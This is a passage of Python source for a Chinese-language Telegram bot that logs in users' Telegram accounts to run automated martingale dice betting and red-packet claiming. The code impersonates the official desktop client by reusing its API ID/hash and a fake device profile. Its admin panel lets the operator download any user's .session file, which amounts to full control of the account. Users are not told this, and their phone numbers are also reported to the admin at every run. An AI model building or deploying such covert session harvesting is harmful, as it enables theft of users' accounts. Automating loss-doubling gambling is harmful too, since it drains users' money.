
import os
import re
import json
import sqlite3
import asyncio
import threading
import logging
from datetime import datetime
import telebot
from telebot import types
from telebot.util import quick_markup

from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PasswordHashInvalidError, 
    UserDeactivatedError, 
    AuthKeyDuplicatedError,
    RpcCallFailError
)
from telethon.tl.functions.messages import StartBotRequest
from telethon.tl.types import ReplyInlineMarkup, KeyboardButtonCallback


try:
    import socks
except ImportError:
    os.system('pip install python-socks[asyncio] pysocks')
    import socks


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# 固定登录参数
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
DEVICE_MODEL = "Satellite A665D"
SYSTEM_VERSION = "Windows 10"
APP_VERSION = "3.4.3 x64"
SYSTEM_LANG_CODE = "en-US"

ADMIN_ID = int(os.getenv('ADMIN_ID'))  
BOT_TOKEN = os.getenv('BOT_TOKEN')  # 从环境变量读取

bot = telebot.TeleBot(BOT_TOKEN)


_original_send_message = bot.send_message

def send_message_safe(chat_id, text, *args, **kwargs):
    if isinstance(text, str) and BOT_TOKEN:
        text = text.replace(BOT_TOKEN, "PROTECTED_BOT_TOKEN_******")
    return _original_send_message(chat_id, text, *args, **kwargs)


bot.send_message = send_message_safe


DB_FILE = "beitoubot_data.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            session_file TEXT,
            red_line REAL DEFAULT 0.0,
            start_amount REAL DEFAULT 10.0,
            profit_target REAL DEFAULT 0.0,
            balance_channel TEXT,
            game_group TEXT,
            status TEXT DEFAULT 'idle'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS temp_login_states (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            phone_code_hash TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admin_proxy (
            id INTEGER PRIMARY KEY,
            ip TEXT,
            port INTEGER,
            username TEXT,
            password TEXT,
            enabled INTEGER DEFAULT 0
        )
    ''')
    cursor.execute("SELECT COUNT(*) FROM admin_proxy")
    if cursor.fetchone()[0] == 0:
        cursor.execute("INSERT INTO admin_proxy (id, ip, port, username, password, enabled) VALUES (1, '', 0, '', '', 0)")
        
    conn.commit()
    conn.close()

init_db()

# ==================== 共享后台线程及运行状态 ====================
user_running_tasks = {} # user_id -> cancel_event (threading.Event)

# ==================== 代理配置访问接口 ====================
def get_admin_proxy():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT ip, port, username, password, enabled FROM admin_proxy WHERE id = 1")
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "ip": row[0],
            "port": row[1],
            "username": row[2],
            "password": row[3],
            "enabled": row[4]
        }
    return {"ip": "", "port": 0, "username": "", "password": "", "enabled": 0}

def update_admin_proxy(**kwargs):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    for k, v in kwargs.items():
        cursor.execute(f"UPDATE admin_proxy SET {k} = ? WHERE id = 1", (v,))
    conn.commit()
    conn.close()

# ==================== 数据库访问助手 ====================
def get_user_config(user_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT phone, session_file, red_line, start_amount, profit_target, balance_channel, game_group, status FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "phone": row[0],
            "session_file": row[1],
            "red_line": row[2],
            "start_amount": row[3],
            "profit_target": row[4],
            "balance_channel": row[5],
            "game_group": row[6],
            "status": row[7]
        }
    return None

def update_user_config(user_id, **kwargs):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    for k, v in kwargs.items():
        cursor.execute(f"UPDATE users SET {k} = ? WHERE user_id = ?", (v, user_id))
    conn.commit()
    conn.close()

def delete_user_account(user_id):
    """
    彻底清除该用户的托管协议数据。
    """
    config = get_user_config(user_id)
    if config and config.get("session_file"):
        s_file = config["session_file"]
        if os.path.exists(s_file):
            try:
                os.remove(s_file)
            except Exception:
                pass
        # 同时移除对应的 journal 等生成文件
        for ext in ['-journal', '.journal']:
            if os.path.exists(s_file + ext):
                try:
                    os.remove(s_file + ext)
                except Exception:
                    pass

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET phone=NULL, session_file=NULL, status='idle' WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

# ==================== Telethon 客户端生成助手 ====================
def get_telethon_client(session_path, loop):
    proxy_info = get_admin_proxy()
    proxy_config = None
    use_ipv6_flag = False
    
    if proxy_info["enabled"] == 1 and proxy_info["ip"] and proxy_info["port"] > 0:
        if ":" in proxy_info["ip"]:
            use_ipv6_flag = True
            
        proxy_config = (
            socks.SOCKS5,
            proxy_info["ip"],
            int(proxy_info["port"]),
            True,
            proxy_info["username"] if proxy_info["username"] else None,
            proxy_info["password"] if proxy_info["password"] else None
        )
        
    return TelegramClient(
        session_path,
        API_ID,
        API_HASH,
        device_model=DEVICE_MODEL,
        system_version=SYSTEM_VERSION,
        app_version=APP_VERSION,
        system_lang_code=SYSTEM_LANG_CODE,
        proxy=proxy_config,
        loop=loop,
        use_ipv6=use_ipv6_flag
    )

# ==================== 统一取消辅助函数 ====================
def make_cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("❌ 取消操作"))
    return markup

def check_and_handle_cancel(message, user_id, fallback_msg="操作已被取消。", is_admin=False):
    text = message.text.strip() if message.text else ""
    if text == "❌ 取消操作" or text.lower() == "cancel" or text == "取消":
        remove_kb = types.ReplyKeyboardRemove()
        bot.send_message(user_id, fallback_msg, reply_markup=remove_kb)
        
        if not is_admin:
            update_user_config(user_id, status='idle')
            bot.send_message(user_id, "已返回主菜单：", reply_markup=build_user_keyboard(user_id))
        else:
            show_admin_menu(user_id)
        return True
    return False

# ==================== 查余额与添加余额基础接口 ====================
async def async_check_balance_core(client):
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return None
        
        await client.get_dialogs()
        kkpay_entity = await client.get_input_entity('@kkpay')
        await client.send_message(kkpay_entity, '/start')
        
        await asyncio.sleep(4)
        messages = await client.get_messages(kkpay_entity, limit=1)
        if not messages:
            return None
        
        latest_text = messages[0].message
        match = re.search(r'💰\s*KKCOIN\s*:\s*([\d\.]+)', latest_text, re.IGNORECASE)
        if match:
            return float(match.group(1))
        return None
    except Exception as e:
        logger.error(f"核心查询余额异常: {e}")
        return None

async def async_claim_balance_core(client, channel_id):
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "❌ 账户授权失效", None
        
        await client.get_dialogs()
        try:
            target_chat = await client.get_input_entity(channel_id)
        except Exception:
            try:
                target_chat = await client.get_input_entity(int(channel_id))
            except Exception:
                return "❌ 解析红包通道失败。", None
        
        messages = await client.get_messages(target_chat, limit=15)
        target_msg = None
        for msg in messages:
            text = msg.message or ""
            if "发送了一个红包" in text:
                if msg.reply_markup and isinstance(msg.reply_markup, ReplyInlineMarkup):
                    target_msg = msg
                    break
        
        if not target_msg:
            return "❌ 未在通道中检测到任何红包消息", None
        
        clicked_btn_text = None
        try:
            if target_msg.buttons:
                for row in target_msg.buttons:
                    for button in row:
                        clean_text = button.text.replace(" ", "").strip()
                        if any(kw in clean_text for kw in ["领", "红包", "🧧", "claim", "get"]):
                            clicked_btn_text = button.text
                            await button.click()
                            break
                    if clicked_btn_text:
                        break
            if not clicked_btn_text:
                await target_msg.click(0, 0)
            await asyncio.sleep(5)
        except Exception:
            return "❌ 红包点击操作失败。", None
            
        new_balance = await async_check_balance_core(client)
        return f"✅ 红包领取指令已下达。正在查询更新后的钱包余额...", new_balance
    except Exception:
        return "❌ 运行过程中发生未知网络异常，请稍后重试。", None

# ==================== 核心倍投任务引擎（带3分钟封盘延迟检测 & 授权撤销熔断） ====================
def run_double_bet_loop(user_id, cancel_event):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def bet_task():
        bot.send_message(user_id, "🚀 自动化倍投系统已启动。正在进行环境检查...")
        config = get_user_config(user_id)
        if not config:
            return
        
        session_file = config['session_file']
        game_group_id = config['game_group']
        start_bet = float(config['start_amount'])
        red_line = float(config['red_line']) if config['red_line'] > 0 else start_bet
        profit_target = float(config['profit_target'])
        phone = config['phone']
        
        # 获取用户昵称
        user_info = bot.get_chat(user_id)
        nickname = f"{user_info.first_name or ''} {user_info.last_name or ''}".strip() or "未知昵称"
        
        client = get_telethon_client(session_file, loop=loop)
        
        # 定义异常熔断处理内部闭包
        async def handle_critical_failure(error_msg):
            """当因为授权撤销等非网络底层原因导致发送失败时，通知用户并直接删除协议"""
            bot.send_message(user_id, f"🚨 *安全熔断通知* 🚨\n\n{error_msg}\n由于该安全风险，系统已强制关闭倍投，并**自动卸载和删除了您的本地授权协议**文件。", parse_mode="Markdown")
            delete_user_account(user_id)
            # 反馈给管理员
            bot.send_message(ADMIN_ID, f"⚠️ 警报：用户 {nickname} (ID: {user_id}) 因非网络原因触发核心发送限制或协议授权已失效，协议已自动被强制卸载删除！")

        try:
            await client.connect()
            if not await client.is_user_authorized():
                bot.send_message(user_id, "❌ 投注开始失败：托管账号授权已失效，请重新添加绑定。")
                update_user_config(user_id, status='idle')
                return
            
            # 获取当前实际起始余额
            current_balance = await async_check_balance_core(client)
            if current_balance is None:
                bot.send_message(user_id, "⚠️ 无法获取当前钱包余额，投注将尝试继续。")
                current_balance = 99999.0
            else:
                bot.send_message(user_id, f"📊 账户当前起始余额: *{current_balance} KKCOIN*", parse_mode="Markdown")
                if current_balance < start_bet:
                    bot.send_message(user_id, f"❌ 账户当前余额 ({current_balance}) 低于起始投注设定额 ({start_bet})，系统已安全退出并暂停倍投。", parse_mode="Markdown")
                    update_user_config(user_id, status='idle')
                    return
            
            # 🚀 1. 开始时发送给管理员反馈
            start_admin_msg = (
                "📈 *[倍投启动反馈]*\n"
                f"👤 用户昵称: {nickname}\n"
                f"🆔 用户 ID: `{user_id}`\n"
                f"📞 协议手机号: `{phone}`\n"
                f"💰 起始金额: `{current_balance} KK`\n"
                f"🎯 盈利目标: `{profit_target if profit_target > 0 else '未设定'} KK`"
            )
            bot.send_message(ADMIN_ID, start_admin_msg, parse_mode="Markdown")
            
            await client.get_dialogs()
            try:
                group_entity = await client.get_input_entity(game_group_id)
            except Exception:
                try:
                    group_entity = await client.get_input_entity(int(game_group_id))
                except Exception:
                    bot.send_message(user_id, "❌ 无法解析指定的游戏群。请检查参数并确保账号已加入该群组。")
                    update_user_config(user_id, status='idle')
                    return
            
            current_bet = start_bet
            end_reason = "异常中止"  # 默认结束反馈原因
            
            while not cancel_event.is_set():
                try:
                    history = await client.get_messages(group_entity, limit=5)
                except Exception as e:
                    logger.error(f"获取群消息异常: {e}")
                    await asyncio.sleep(5)
                    continue
                
                can_bet = False
                for m in history:
                    if m.message and "在游戏过程中如果更改机器人权限则本局游戏直接判负" in m.message:
                        can_bet = True
                        break
                
                if not can_bet:
                    logger.info(f"用户 {user_id}: 未检测到可投注状态提示，5秒后重试...")
                    await asyncio.sleep(5)
                    continue
                
                # 下注前余额红线与止盈检测
                balance_check = await async_check_balance_core(client)
                if balance_check is not None:
                    current_balance = balance_check
                    if current_balance < red_line:
                        bot.send_message(user_id, f"🚨 🚨 🚨 *倍投计划已熔断*！原因：当前余额 ({current_balance}) 已低于您设定的资金安全红线 ({red_line})。", parse_mode="Markdown")
                        end_reason = "自动熔断"
                        break
                    if current_balance < current_bet:
                        bot.send_message(user_id, f"⚠️ *倍投意外中止*！原因：当前钱包余额不足以下注当前翻倍额度 (*{current_bet} KKCOIN*)。", parse_mode="Markdown")
                        end_reason = "余额不足"
                        break
                    if profit_target > 0 and current_balance >= profit_target:
                        bot.send_message(user_id, f"🎉 *已达止盈目标*！当前余额 ({current_balance}) 已达到或超出您的期望平仓目标 ({profit_target})，自动止盈停手！", parse_mode="Markdown")
                        end_reason = "达到盈利"
                        break
                
                # 🛠️ 改造点1：合并下注。将 ds 和 xd 合并在同条消息中发送，并使用换行符分隔。
                bet_msg_text = f"ds{int(current_bet)}\nxd{int(current_bet)}"
                logger.info(f"正在合并下注发送 (换行格式):\n{bet_msg_text}")
                
                # 🛠️ 改造点3：捕获因被撤销授权、限制发送引发的异常并执行熔断
                try:
                    await client.send_message(group_entity, bet_msg_text)
                except (UserDeactivatedError, AuthKeyDuplicatedError) as auth_err:
                    await handle_critical_failure(f"❌ 您的托管账号已被强制下线、撤销授权或在其他地方重复登录（{type(auth_err).__name__}）。")
                    return
                except RpcCallFailError as limit_err:
                    await handle_critical_failure(f"❌ 您的账号发送消息被 Telegram 官方限制或封禁（{type(limit_err).__name__}）。")
                    return
                except Exception as send_err:
                    logger.error(f"下注发送时出现其他通讯波动: {send_err}")
                    bot.send_message(user_id, "⚠️ 发送下注指令时网络出现波动，正在重试...")
                    await asyncio.sleep(5)
                    continue

                # 🛠️ 改造点2：投注完5秒后进行封盘检测与3分钟循环监听
                await asyncio.sleep(5)
                
                is_frozen = False
                # 检查最近的 3 条消息
                try:
                    chk_history = await client.get_messages(group_entity, limit=3)
                    for msg in chk_history:
                        if msg.message and "已经封盘" in msg.message:
                            is_frozen = True
                            break
                except Exception as e:
                    logger.error(f"5秒封盘检测读取异常: {e}")
                
                if is_frozen:
                    bot.send_message(user_id, "⚠️ 检测到当前已封盘，本次投注失败！系统将每10秒检测一次，等待下一次投注开始...")
                    
                    wait_success = False
                    # 开启最长 3分钟(180秒) 的每 10 秒检测循环，等待下一次投注提示重新开始
                    for _ in range(18): # 18 * 10秒 = 180秒
                        await asyncio.sleep(10)
                        if cancel_event.is_set():
                            break
                        try:
                            detect_history = await client.get_messages(group_entity, limit=5)
                            for dm in detect_history:
                                if dm.message and "在游戏过程中如果更改机器人权限则本局游戏直接判负" in dm.message:
                                    wait_success = True
                                    break
                        except Exception as de:
                            logger.error(f"等待新一轮检测异常: {de}")
                        
                        if wait_success:
                            break
                    
                    if not wait_success:
                        bot.send_message(user_id, "🛑 超过 3 分钟仍未开始新一轮投注，为确保资金安全，已退出投注。")
                        end_reason = "开奖超时"
                        break
                    else:
                        bot.send_message(user_id, "🟢 新的一轮已经开始，正在重新切入下注流程...")
                        continue  # 重新开始下注循环
                
                # 正常情况：抓取开奖期号
                period_id = None
                for _ in range(5):
                    chk_history = await client.get_messages(group_entity, limit=5)
                    for msg in chk_history:
                        if msg.message and "期号:" in msg.message:
                            match = re.search(r'期号\s*:\s*([a-zA-Z0-9]+)', msg.message)
                            if match:
                                period_id = match.group(1)
                                break
                    if period_id:
                        break
                    await asyncio.sleep(2)
                
                # 静默开奖抓取（延长至 3 分钟监听：18次 * 10秒）
                round_result = None
                for attempt in range(1, 19): # 180 秒监听
                    await asyncio.sleep(10)
                    if cancel_event.is_set():
                        break
                    
                    try:
                        res_history = await client.get_messages(group_entity, limit=5)
                    except Exception as e:
                        logger.error(f"获取开奖历史消息异常: {e}")
                        continue
                    
                    target_result_msg = None
                    for rm in res_history:
                        if rm.message and "恭喜在快三游戏中获胜的用户" in rm.message:
                            if period_id and period_id in rm.message:
                                target_result_msg = rm.message
                                break
                            elif not period_id:
                                target_result_msg = rm.message
                                break
                    
                    if target_result_msg:
                        if "小单" in target_result_msg or "大双" in target_result_msg:
                            round_result = 'win'
                        else:
                            round_result = 'lose'
                        break
                
                if cancel_event.is_set():
                    end_reason = "手动停止"
                    break
                
                if round_result is None:
                    bot.send_message(user_id, "⚠️ 系统超过 3 分钟未能抓取到对应的开奖通知，判定开奖异常，已退出投注。")
                    end_reason = "开奖超时"
                    break
                
                # 结算与翻倍机制
                if round_result == 'win':
                    bot.send_message(user_id, f"🎉 *本局获胜*。下注金额重置回到初始设置: *{start_bet} KKCOIN*", parse_mode="Markdown")
                    current_bet = start_bet
                else:
                    current_bet = current_bet * 2
                    bot.send_message(user_id, f"📉 *本局未中*。下注进入翻倍：下一轮金额将调至 *{current_bet} KKCOIN*", parse_mode="Markdown")
                
                await asyncio.sleep(5)
                
            bot.send_message(user_id, "🏁 倍投运行结束。正在计算当前账户最终余额...")
            final_balance = await async_check_balance_core(client)
            if final_balance is not None:
                bot.send_message(user_id, f"ℹ️ 当前账户最终总结余为: *{final_balance} KKCOIN*", parse_mode="Markdown")
            else:
                bot.send_message(user_id, "ℹ️ 连接暂时受限，未能返回最终的钱包具体结存，系统已完成退出。")
            
            # 🚀 2. 结束时发送给管理员反馈
            end_admin_msg = (
                "📉 *[倍投结束反馈]*\n"
                f"👤 用户昵称: {nickname}\n"
                f"🆔 用户 ID: `{user_id}`\n"
                f"📞 协议手机号: `{phone}`\n"
                f"🏁 结束原因: *{end_reason}*"
            )
            bot.send_message(ADMIN_ID, end_admin_msg, parse_mode="Markdown")

        except Exception as e:
            logger.error(f"倍投引擎异常: {e}")
            bot.send_message(user_id, "❌ 自动化投注任务由于异常通讯中断而中止。")
        finally:
            update_user_config(user_id, status='idle')
            await client.disconnect()

    try:
        loop.run_until_complete(bet_task())
    finally:
        loop.close()

# ==================== 界面按钮菜单绘制 ====================
def build_user_keyboard(user_id):
    config = get_user_config(user_id)
    if not config:
        config = {"phone": None, "session_file": None, "status": "idle"}
        
    has_account = config.get("phone") is not None
    is_running = config.get("status") == "running"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    if is_running:
        markup.add(types.InlineKeyboardButton("🛑 停止操作", callback_data="stop_bet"))
        return markup
        
    if not has_account:
        markup.add(types.InlineKeyboardButton("➕ 添加账户 (挂载协议)", callback_data="add_account"))
    else:
        btn_balance = types.InlineKeyboardButton("💰 查看余额", callback_data="check_balance")
        btn_config = types.InlineKeyboardButton("⚙️ 参数配置", callback_data="config_panel")
        
        if config.get("balance_channel"):
            btn_add_bal = types.InlineKeyboardButton("🎁 添加余额 (一键拆红包)", callback_data="add_balance")
            markup.row(btn_balance, btn_add_bal)
            markup.row(btn_config)
        else:
            markup.row(btn_balance, btn_config)
            
        btn_start = types.InlineKeyboardButton("⚡ 启动倍投", callback_data="start_bet")
        btn_release = types.InlineKeyboardButton("🔓 释放账户", callback_data="release_account")
        markup.row(btn_start, btn_release)
        
    return markup

def build_config_keyboard(user_id):
    config = get_user_config(user_id) or {}
    rl = config.get("red_line", 0.0)
    sa = config.get("start_amount", 10.0)
    pt = config.get("profit_target", 0.0)
    bc = config.get("balance_channel") or "未设置"
    gg = config.get("game_group") or "未设置"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(f"🚨 资金红线 (当前: {rl})", callback_data="set_red_line"),
        types.InlineKeyboardButton(f"🎲 起始投注 (当前: {sa} *)", callback_data="set_start_amount"),
        types.InlineKeyboardButton(f"📈 盈利停手 (当前: {pt if pt > 0 else '未设置'})", callback_data="set_profit_target"),
        types.InlineKeyboardButton(f"📣 余额通道 ID (当前: {bc})", callback_data="set_balance_channel"),
        types.InlineKeyboardButton(f"💬 游戏群 ID/用户名 (当前: {gg} *)", callback_data="set_game_group"),
        types.InlineKeyboardButton("🔙 返回主菜单", callback_data="main_menu")
    )
    return markup

# ==================== 管理员管理面板与代理配置界面 ====================
ADMIN_PAGE_SIZE = 5

def show_admin_menu(chat_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users WHERE phone IS NOT NULL")
    active_protocols = cursor.fetchone()[0]
    conn.close()
    
    proxy = get_admin_proxy()
    p_status = "🟢 启用" if proxy["enabled"] == 1 else "🔴 禁用"
    p_ip = proxy["ip"] if proxy["ip"] else "无"
    p_port = proxy["port"] if proxy["port"] > 0 else "无"
    
    msg_text = (
        "📊 *WitchMagic 管理员后台中心*\n\n"
        f"👥 系统注册人数: {total_users} 人\n"
        f"🔌 已挂载激活协议数: {active_protocols} 个\n"
        f"🛡️ 全局 Socks5 代理: {p_status} ({p_ip}:{p_port})\n\n"
        "请选择对应的操作板块："
    )
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_view_protocols = types.InlineKeyboardButton("🔌 查看激活挂载协议", callback_data="adm_view_protocols_0")
    btn_broadcast = types.InlineKeyboardButton("📢 发送群发广播", callback_data="adm_broadcast")
    btn_proxy = types.InlineKeyboardButton("🛡️ 配置 SOCKS5 代理", callback_data="adm_proxy_menu")
    btn_close = types.InlineKeyboardButton("❌ 关闭管理中心", callback_data="adm_close")
    
    markup.add(btn_view_protocols, btn_broadcast, btn_proxy, btn_close)
    bot.send_message(chat_id, msg_text, parse_mode="Markdown", reply_markup=markup)

def show_admin_protocols_list(chat_id, page=0):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, phone FROM users WHERE phone IS NOT NULL")
    all_active = cursor.fetchall()
    conn.close()
    
    if not all_active:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 返回管理菜单", callback_data="adm_back_to_menu"))
        bot.send_message(chat_id, "🔌 目前系统内没有任何挂载中的账户协议文件。", reply_markup=markup)
        return

    msg_text = (
        "🔌 *已挂载协议管理列表*\n\n"
        "点击下方的手机号，可以直接提取对应账号的 `.session` 协议文件："
    )
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    start_idx = page * ADMIN_PAGE_SIZE
    end_idx = start_idx + ADMIN_PAGE_SIZE
    page_items = all_active[start_idx:end_idx]
    
    for usr_id, phone in page_items:
        markup.add(types.InlineKeyboardButton(f"📞 {phone} ({usr_id})", callback_data=f"adm_get_{usr_id}"))
        
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("⬅️ 上一页", callback_data=f"adm_listpage_{page-1}"))
    if end_idx < len(all_active):
        nav_buttons.append(types.InlineKeyboardButton("下一页 ➡️", callback_data=f"adm_listpage_{page+1}"))
    if nav_buttons:
        markup.row(*nav_buttons)
        
    markup.add(types.InlineKeyboardButton("🔙 返回上一级", callback_data="adm_back_to_menu"))
    bot.send_message(chat_id, msg_text, parse_mode="Markdown", reply_markup=markup)

def build_proxy_settings_keyboard():
    proxy = get_admin_proxy()
    ip = proxy["ip"] or "未设置"
    port = proxy["port"] if proxy["port"] > 0 else "未设置"
    user = proxy["username"] or "未设置"
    pwd = proxy["password"] or "未设置"
    status_str = "🟢 已启用 (点击禁用)" if proxy["enabled"] == 1 else "🔴 已禁用 (点击启用)"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(f"状态: {status_str}", callback_data="adm_proxy_toggle"),
        types.InlineKeyboardButton(f"🌐 IP: {ip}", callback_data="adm_proxy_set_ip"),
        types.InlineKeyboardButton(f"🔌 端口号: {port}", callback_data="adm_proxy_set_port"),
        types.InlineKeyboardButton(f"👤 用户名: {user}", callback_data="adm_proxy_set_user"),
        types.InlineKeyboardButton(f"🔑 密码: {pwd}", callback_data="adm_proxy_set_pwd"),
        types.InlineKeyboardButton("🔙 返回管理菜单", callback_data="adm_back_to_menu")
    )
    return markup

# ==================== Telebot 基础事件分发 ====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    config = get_user_config(user_id)
    if not config:
        update_user_config(user_id, status='idle')
        
    welcome_text = (
        "🧙‍♂️ *WitchMagic 协议托管与倍投管家*\n\n"
        "本机器人支持多用户管理，您可以挂载 `.session` 账户，并在指定的游戏群内自动执行倍投计划。\n"
        "一旦余额低于红线，或达到了您设定的停手机制，系统将自动熔断，确保资金安全。"
    )
    bot.send_message(user_id, welcome_text, parse_mode="Markdown", reply_markup=build_user_keyboard(user_id))

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ 您没有管理员权限。")
        return
    show_admin_menu(user_id)

# ==================== 后台同步辅助线程 ====================

def thread_worker_check_balance(user_id, session_file):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    client = get_telethon_client(session_file, loop=loop)
    try:
        bal = loop.run_until_complete(async_check_balance_core(client))
        if bal is not None:
            bot.send_message(user_id, f"💰 检查完成：您当前的 KKCOIN 余额为 *{bal}*", parse_mode="Markdown")
        else:
            bot.send_message(user_id, "❌ 余额查询暂时失败，可能因为第三方接口延迟响应，请稍候再试。")
    except Exception as e:
        logger.error(f"线程查询余额崩溃: {e}")
        bot.send_message(user_id, "❌ 通信连接受限，未能在规定时间内拉取数据。")
    finally:
        try:
            loop.run_until_complete(client.disconnect())
        except Exception:
            pass
        loop.close()

def thread_worker_claim_balance(user_id, session_file, balance_channel):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    client = get_telethon_client(session_file, loop=loop)
    try:
        status_msg, new_bal = loop.run_until_complete(async_claim_balance_core(client, balance_channel))
        bot.send_message(user_id, status_msg)
        if new_bal is not None:
            bot.send_message(user_id, f"📊 当前账户余额为: *{new_bal} KKCOIN*", parse_mode="Markdown")
    except Exception as e:
        logger.error(f"线程抢红包崩溃: {e}")
        bot.send_message(user_id, "❌ 红包功能运行中发生异常：暂未在配置的通道中捕捉到最新未领取的红包。")
    finally:
        try:
            loop.run_until_complete(client.disconnect())
        except Exception:
            pass
        loop.close()

# ==================== 回调事件处理 ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    data = call.data
    
    # --- 管理员相关动作分支 ---
    if data.startswith("adm_"):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "权限不足")
            return
            
        if data.startswith("adm_view_protocols_") or data.startswith("adm_listpage_"):
            page = int(data.split("_")[-1])
            bot.answer_callback_query(call.id)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            show_admin_protocols_list(user_id, page=page)
            
        elif data == "adm_back_to_menu":
            bot.answer_callback_query(call.id)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            show_admin_menu(user_id)
            
        elif data.startswith("adm_get_"):
            target_uid = int(data.split("_")[2])
            config = get_user_config(target_uid)
            if config and config["session_file"]:
                s_file = config["session_file"]
                if os.path.exists(s_file):
                    bot.answer_callback_query(call.id, "正在提取...")
                    with open(s_file, "rb") as doc_file:
                        bot.send_document(user_id, doc_file, caption=f"📤 用户 {target_uid} 的 Telegram 协议文件 ({config['phone']})")
                else:
                    bot.answer_callback_query(call.id, "错误：会话缓存丢失。")
            else:
                bot.answer_callback_query(call.id, "用户未绑定协议")
                
        elif data == "adm_broadcast":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "💬 请回复您想要向所有人广播的消息内容：\n(随时输入或点击 '❌ 取消操作' 退出)", reply_markup=make_cancel_keyboard())
            bot.register_next_step_handler(msg, process_admin_broadcast)
            
        elif data == "adm_close":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            
        elif data == "adm_proxy_menu":
            bot.answer_callback_query(call.id)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(user_id, "🛡️ *WitchMagic 全局 SOCKS5 代理配置*\n\n请点击下方按钮分别设定各项连接参数：", 
                             parse_mode="Markdown", reply_markup=build_proxy_settings_keyboard())
            
        elif data == "adm_proxy_toggle":
            proxy = get_admin_proxy()
            new_state = 0 if proxy["enabled"] == 1 else 1
            update_admin_proxy(enabled=new_state)
            bot.answer_callback_query(call.id, f"代理已{'启用' if new_state == 1 else '禁用'}")
            bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=build_proxy_settings_keyboard())
            
        elif data == "adm_proxy_set_ip":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "🌐 请输入您的 SOCKS5 代理服务器 IP：", reply_markup=make_cancel_keyboard())
            bot.register_next_step_handler(msg, lambda m: process_admin_proxy_input(m, "ip"))
            
        elif data == "adm_proxy_set_port":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "🔌 请输入您的 SOCKS5 代理服务器 端口号 (必须为数字)：", reply_markup=make_cancel_keyboard())
            bot.register_next_step_handler(msg, lambda m: process_admin_proxy_input(m, "port"))
            
        elif data == "adm_proxy_set_user":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "👤 请输入您的 SOCKS5 代理用户名 (如无请留空输入 'none')：", reply_markup=make_cancel_keyboard())
            bot.register_next_step_handler(msg, lambda m: process_admin_proxy_input(m, "username"))
            
        elif data == "adm_proxy_set_pwd":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "🔑 请输入您的 SOCKS5 代理密码 (如无请留空输入 'none')：", reply_markup=make_cancel_keyboard())
            bot.register_next_step_handler(msg, lambda m: process_admin_proxy_input(m, "password"))
            
        return

    # --- 用户普通动作分支 ---
    config = get_user_config(user_id)
    if not config:
        update_user_config(user_id, status='idle')
        config = get_user_config(user_id)
        
    if data == "main_menu":
        bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=build_user_keyboard(user_id))
        
    elif data == "config_panel":
        bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=build_config_keyboard(user_id))
        
    elif data == "add_account":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(user_id, "📱 请输入您准备挂载的手机号 (例如: +8613800000000):\n(随时输入或点击 '❌ 取消操作' 退出)", reply_markup=make_cancel_keyboard())
        bot.register_next_step_handler(msg, process_phone_input)
        
    elif data == "check_balance":
        bot.answer_callback_query(call.id, "正在请求第三方 KKPay，请稍等...")
